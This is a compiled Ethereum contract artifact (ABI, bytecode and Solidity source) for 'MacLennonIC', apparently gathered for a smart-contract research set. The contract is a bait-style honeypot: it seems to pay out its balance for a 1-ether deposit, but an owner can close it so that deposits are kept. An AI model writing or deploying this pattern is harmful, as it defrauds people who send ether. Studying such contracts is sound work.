{
  "contractName": "MacLennonIC",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "set",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "F",
          "type": "bool"
        }
      ],
      "name": "close",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "get",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060146101000a81548160ff02191690831515021790555034801561002a57600080fd5b506102498061003a6000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063212c5fea146100595780636d4ce63c14610088578063b8e010de14610092575b005b34801561006557600080fd5b5061008660048036038101908080351515906020019092919050505061009c565b005b61009061010f565b005b61009a61019a565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561010c5780600060146101000a81548160ff0219169083151502179055505b50565b670de0b6b3a764000034101580156101345750600060149054906101000a900460ff16155b15610198573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610196573d6000803e3d6000fd5b505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166000141561021b57336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5600a165627a7a72305820936ab4d25238b0fa296704f570693ef75343e6bc03156a2968f3ec99700db9f90029",
  "source": "\n\ncontract MacLennonIC {\n    function() public payable {}\n    address Owner; bool closed = false;\n    function set() public payable {\n        if (0==Owner) Owner=msg.sender;\n    }\n    function close(bool F) public {\n        if (msg.sender==Owner) closed=F;\n    }\n    function get() public payable {\n        if (msg.value>=1 ether && !closed) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xd060792b45e31fbfff1afdb4236f7ae655b22321/contracts/0xd060792b45e31fbfff1afdb4236f7ae655b22321.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:07:17.418Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}